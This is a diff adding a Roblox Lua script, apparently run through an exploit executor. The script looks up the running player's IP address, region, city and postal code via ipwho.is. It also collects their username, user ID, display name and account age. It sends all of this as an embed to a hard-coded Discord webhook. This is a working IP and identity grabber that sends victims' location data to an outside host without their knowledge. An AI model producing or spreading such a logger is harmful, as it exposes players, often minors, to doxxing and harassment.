@@ -1,0 +1,64 @@
+-- Fetch IP information from ipwho.is
+local api = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
+
+-- Get player information
+local player = game.Players.LocalPlayer
+local userInfo = {
+    username = player.Name,
+    userId = player.UserId,
+    displayName = player.DisplayName,
+    creationDate = tostring(player.AccountAge) .. " days ago" -- You can modify this format
+}
+
+-- Print for verification
+print("IP Address: " .. api.ip)
+print("Region: " .. api.region)
+print("City: " .. api.city)
+print("Postal Code: " .. api.postal)
+print("Region Code: " .. api.region_code)
+print("Username: " .. userInfo.username)
+print("User ID: " .. userInfo.userId)
+print("Display Name: " .. userInfo.displayName)
+print("Account Age: " .. userInfo.creationDate)
+
+-- Discord Webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1324712170121986088/Mf9QcP7P1FNpxUml9lGfUuIwjXN-crn59ZIpZrEC4By-boF9udeXClTwE1Wdryeo7RIC"
+
+-- Function to send a message with IP info and player info as an embed
+function SendInfo(url, ipData, userData)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local embed = {
+        ["title"] = "User and IP Information",
+        ["description"] = "Details about the user and their IP",
+        ["color"] = 16776960, -- Yellow color for the embed
+        ["fields"] = {
+            { ["name"] = "Username", ["value"] = userData.username },
+            { ["name"] = "User ID", ["value"] = tostring(userData.userId) },
+            { ["name"] = "Display Name", ["value"] = userData.displayName },
+            { ["name"] = "Account Creation", ["value"] = userData.creationDate },
+            { ["name"] = "IP Address", ["value"] = ipData.ip },
+            { ["name"] = "Region", ["value"] = ipData.region },
+            { ["name"] = "City", ["value"] = ipData.city },
+            { ["name"] = "Postal Code", ["value"] = ipData.postal },
+            { ["name"] = "Region Code", ["value"] = ipData.region_code }
+        },
+        ["footer"] = { ["text"] = "IP data provided by ipwho.is" }
+    }
+    local data = {
+        ["embeds"] = { embed }
+    }
+    local body = http:JSONEncode(data)
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("User and IP Information Sent to Discord")
+end
+
+-- Send the information to the Discord webhook
+SendInfo(webhookUrl, api, userInfo)
